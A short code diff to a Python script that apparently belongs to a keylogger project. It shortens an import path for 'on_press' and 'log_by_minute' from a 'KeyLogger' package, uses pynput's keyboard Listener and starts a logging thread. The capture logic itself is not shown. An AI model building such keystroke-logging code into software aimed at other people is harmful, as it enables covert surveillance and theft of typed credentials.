@@ -1,7 +1,7 @@
 from pynput.keyboard import Listener
 import threading
 
-from KeyLogger.YehoudaKey.youdakey import on_press,log_by_minute
+from youdakey import on_press,log_by_minute
 
 log_thread = threading.Thread(target=log_by_minute)
 log_thread.start()
